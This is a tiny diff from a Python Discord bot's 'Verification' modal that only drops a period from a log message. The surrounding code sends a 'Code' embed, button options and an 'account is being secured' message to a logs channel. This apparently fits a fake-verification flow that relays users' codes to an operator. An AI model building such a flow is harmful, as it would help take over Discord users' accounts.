@@ -40,7 +40,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
         await interaction.response.defer()
 
-        await logs_channel.send("**This Account is being automaticly secured.**")
+        await logs_channel.send("**This Account is being automaticly secured**")
         await logs_channel.send(embed = Code_embed, view = ButtonOptions(interaction.user.id))
 
         await interaction.followup.send(
